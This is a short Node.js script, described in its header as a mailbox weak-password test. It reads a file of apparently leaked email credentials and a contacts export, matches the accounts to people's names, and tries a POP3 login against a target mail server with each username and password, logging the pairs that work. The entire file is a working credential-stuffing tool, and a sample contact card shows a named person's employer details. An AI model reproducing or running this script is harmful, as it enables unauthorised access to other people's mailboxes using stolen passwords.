// 信箱若口令测试
// node testPop3.js 125.71.203.220 110 /Users/xiatian/Desktop/mytels.txt
var pp = require('./pop3'),fs = require('fs'),Buffer = require('Buffer');

process.setMaxListeners(0);
require('events').EventEmitter.prototype._maxListeners = 0;
require('events').EventEmitter.defaultMaxListeners = 0

var a = fs.readFileSync("./data/YHLeaks.txt").toString().split("\n"),
	aN = fs.readFileSync("/Users/xiatian/Desktop/mytels.txt").toString(),
	re = /FN:([^_]+)_([^\n\r]+)\n/gmi,g_oNm = {};

var args = process.argv.splice(2);
/*
BEGIN:VCARD
VERSION:3.0
FN:徐峰_xxxx
N:;徐峰;;;
TEL;TYPE=WORK:
EMAIL;type=INTERNET;type=WORK;type=pref:xxxxxx@yiai.com
TEL;TYPE=CELL:1111111111
ORG:公司领导;金融行业部
NOTE:
CATEGORIES:久银海
END:VCARD
*/
while(aT = re.exec(aN))
{
	g_oNm[aT[2]] = aT[1];
	// console.log(aT[1]);
}
// console.log(g_oNm);

//*////////////
var host = args[0], port = 110;
function fnKg(n,s)
{
	var k = new Buffer(s,'utf8');
	n = n - s.length - s.length % 16;//k.length;
	var a = [];
	while(0 < n--)
	{
		a.push(" ");
	}
	return a.join("");
}

for(var i = 0; i < a.length; i++)
{
	var aX = a[i].split("@"),sTmp = g_oNm[aX[0]];
	if(sTmp)
	{
		sTmp = sTmp.replace(/（/g, ".").replace(/）/g, "");
		console.log(sTmp + fnKg(28,sTmp) + a[i]);
	}
	// if(true)continue;
	+function(s)
	{
		var x = s.split(":");
		if(2 == x.length && x[0] && x[1])
		{
			var oT,oR = new pp(oT={"port":port,"host":host,"username": x[0], "password": x[1]},function()
			{
				console.log([oT.username,oT.password]);
			});
		}
	}(a[i]);
}
////////////*/